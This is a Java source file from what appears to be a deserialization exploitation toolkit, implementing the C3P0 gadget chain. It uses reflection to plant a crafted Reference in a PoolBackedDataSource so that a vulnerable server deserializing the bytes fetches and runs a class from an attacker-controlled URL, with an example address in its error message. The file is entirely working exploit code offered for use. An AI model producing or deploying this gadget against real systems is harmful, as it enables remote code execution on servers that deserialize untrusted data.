package sonomon.jndi.deser.gadgets;


import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import sonomon.jndi.deser.MyURLClassLoader;
import sonomon.jndi.factory.FactoryUtils;

public class C3P0 implements SerializeObject{
    public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
        MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class clazz = classLoader.loadClass("com.mchange.v2.c3p0.PoolBackedDataSource");
        Constructor con = clazz.getDeclaredConstructor(new Class[0]);
        con.setAccessible(true);
        Object obj = con.newInstance(new Object[0]);
        Field conData = com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        conData.setAccessible(true);
    	try {
    		URL url = new URL(payload);
    		conData.set(obj, new PoolSource(url.getPath().replace("/", ""), url.getProtocol()+"://"+url.getHost()+":"+url.getPort()+"/"));
		} catch (Exception e) {
			System.out.println("[-] c3p0 url不规范:"+payload+" 参考http://127.0.0.1:81/exp\r\n");
		}
        return obj;
    }
    
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	
	  private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
		  	private String className;
		  	private String url;
		  	public PoolSource(String className, String url) {
	            this.className = className;
	            this.url = url;
	        }
	      	public Reference getReference() throws NamingException {
	            return new Reference("exploit", this.className, this.url);
	        }
			@Override
			public PrintWriter getLogWriter() throws SQLException {
				return null;
			}
			@Override
			public void setLogWriter(PrintWriter out) throws SQLException {
			}
			@Override
			public void setLoginTimeout(int seconds) throws SQLException {
			}
			@Override
			public int getLoginTimeout() throws SQLException {
				return 0;
			}
			@Override
			public Logger getParentLogger() throws SQLFeatureNotSupportedException {
				return null;
			}
			@Override
			public PooledConnection getPooledConnection() throws SQLException {
				return null;
			}
			@Override
			public PooledConnection getPooledConnection(String user, String password) throws SQLException {
				return null;
			}

	  }
}